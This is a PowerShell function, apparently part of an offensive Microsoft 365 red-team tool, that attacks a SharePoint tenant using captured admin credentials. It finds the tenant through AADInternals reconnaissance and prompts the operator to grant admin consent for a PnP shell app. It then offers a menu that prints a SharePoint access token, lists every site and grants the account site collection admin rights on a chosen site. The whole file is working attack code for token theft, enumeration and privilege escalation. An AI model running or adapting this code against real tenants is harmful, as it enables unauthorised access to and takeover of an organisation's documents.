function SharepointExploiter {

    mitre_details("SharepointExploiter")

    $sharepoint_url = Read-Host -Prompt "Enter sharepoint url (or leave blank if you would like the tool to OSINT and find the url"

    #Find the sharepoint URL
    if ($sharepoint_url -notin "No","no","N","n"){
        $tenant = $global:AdminUsername.Split("@")[1]
        $tenant_intel = Invoke-AADIntReconAsOutsider -DomainName $tenant

        foreach ($domain in $tenant_intel){
            #Write-Host $domain.Name
            if ($domain.Name -match ".onmicrosoft.com" -and $domain.Name -notmatch ".mail.onmicrosoft.com"){
                $sharepoint_tenant = $domain.Name.Split(".")[0]
            }
        }
        $sharepoint_url = "https://$sharepoint_tenant.sharepoint.com"
        Write-Host "Sharepoint url: $sharepoint_url"
    }

    $attempt = $true
    while ($attempt) {
        try {
            Write-Host "Attempting access to Sharepoint"
            Connect-PnPOnline -Url $sharepoint_url -Credentials $global:AdminCredential -ErrorAction Stop
            $attempt = $false
        }
        catch {
            Write-Error "Failed to access Sharepoint. `n$_"
            #Write-Host "Accessing sharepoint via powershell requires explicit consent to allow access to sharepoint. Copy paste this URL in your browser and approve the prompt!" -ForegroundColor Yellow -BackgroundColor Black
            #Write-Host "URL: https://login.microsoftonline.com/$tenant/adminconsent?client_id=$client_id"
            #Write-Host "URL: https://login.microsoftonline.com/$tenant/adminconsent?client_id=9bc3ab49-b65d-410a-85ad-de819febfddc" -ForegroundColor Yellow -BackgroundColor Black
            Write-Host "Accessing sharepoint via powershell requires explicit consent to allow access to sharepoint."
            $null = Read-Host "The tool will now launch a authorization page on your browser. Consent to the terms and hit authorize, then return here. press 'Enter' to launch the browser authorization page" 
            Register-PnPManagementShellAccess
            Write-Host "Note: If the browser does not launch automatically for some reason. Open your browser and use this URL to visit the authorization page `nURL: https://login.microsoftonline.com/$tenant/adminconsent?client_id=9bc3ab49-b65d-410a-85ad-de819febfddc `n" -ForegroundColor Gray
            
            $user_prompt = Read-Host "Once you have completed the authorization in browser press 'Enter' to continue or 'exit' to exit the module..." 
            
            if ( $user_prompt.ToLower() -eq "exit") {
                break
            }
        } 
    }


    try {
        Write-Host "Attempting access to Sharepoint Admin Center"
        Connect-SPOService -Url "https://$sharepoint_tenant-admin.sharepoint.com" -Credential $global:AdminCredential -ErrorAction Stop
    }
    catch {
        Write-Error "Failed to access Sharepoint Admin center. `n$_"
        Write-Host "Exiting module now!!!"
        return $null
    }


    $sharepoint_options = @{0 = "Back to main menu"; 1 = "Retrieve Sharepoint Access Token"; 2 = "List all sites in the tenant"; 3 = "Explore a sharepoint site"; 4 = "Gain rights to a sharepoint site"}
    #$sharepoint_options = @{0 = "Back to main menu"; 1 = "Retrieve Sharepoint Access Token"; 2 = "List all sites in the tenant"; 3 = "Explore a sharepoint site"; 4 = "Gain rights to a sharepoint site"; 5 = "Remove rights from a sharepoint site (Undo option 4)"}
    do {
        Write-Host "`n`nSharepoint options:" -ForegroundColor Yellow
        foreach ($key in $sharepoint_options.keys){
            Write-Host $key ':' $sharepoint_options[$key]
        }    

        while ($true) {
            try {
                Write-Host "`n"
                [int]$recon_user_choice = Read-Host -Prompt 'Choose a Sharepoint option:'
                break
            }
            catch {
                Write-Host "Invalid input!!! Choose an option number from the list!"
            }
        }
        
         if ($recon_user_choice -eq 1) {
            #Get sharepoint access token
            Write-Host "`n#####################################TOKEN######################################`n"
            Get-PnPAppAuthAccessToken
            Write-Host "`n################################################################################`n"
            #Export and save this token
         }

         if ($recon_user_choice -eq 2) {
            #List all sites in tenant
            Write-Host "`nListing all available sites in sharepoint ...`n" -ForegroundColor Yellow
            Get-SPOSite | Format-Table URL
         }

         if ($recon_user_choice -eq 3) {
            #Explore a sharepoint site
            $site_list = Get-SPOSite
            Write-Host ""
            foreach ($item in $site_list){
                Write-Host $([array]::IndexOf($site_list,$item)+1) ':' $item.URL
            }  
            
            while ($true) {
                try {
                    Write-Host "`n"
                    [int]$site_choice = Read-Host -Prompt "Select a sharepoint site from the list you would like to explore"
                    break
                }
                catch {
                    Write-Host "Invalid input!!! Choose an option number from the list!"
                }
            }
            #Explore site
            SharepointSiteExploiter($site_list[$site_choice-1].URL)
         }

         if ($recon_user_choice -eq 4) {
            #Explore a sharepoint site
            $site_list = Get-SPOSite
            Write-Host ""
            foreach ($item in $site_list){
                Write-Host $([array]::IndexOf($site_list,$item)+1) ':' $item.URL
            }  
            
            while ($true) {
                try {
                    Write-Host "`n"
                    [int]$site_choice = Read-Host -Prompt "Select a sharepoint site from the list you would like to gain rights to" -ErrorAction Stop
                    break
                }
                catch {
                    Write-Host "Invalid input!!! Choose an option number from the list!"
                }
            }

            #Grant rights in site
            Write-Host "Attempting to gain admin rights in the sharepoint site ..."
            try {
                Set-SPOUser -Site $site_list[$site_choice-1].URL -LoginName $global:AdminUsername -IsSiteCollectionAdmin $true -ErrorAction Stop
                Start-Sleep -Seconds 5
                Write-Host "Successfully gained admin rights in sharepoint site $($site_list[$site_choice-1].URL)" -ForegroundColor Yellow -BackgroundColor Black
            }
            catch {
                Write-Host "Error : Failed to get admin rights in sharepoint site $($site_list[$site_choice-1].URL)"
            }
            
         }

    } while (
        $recon_user_choice -ne 0)
        
}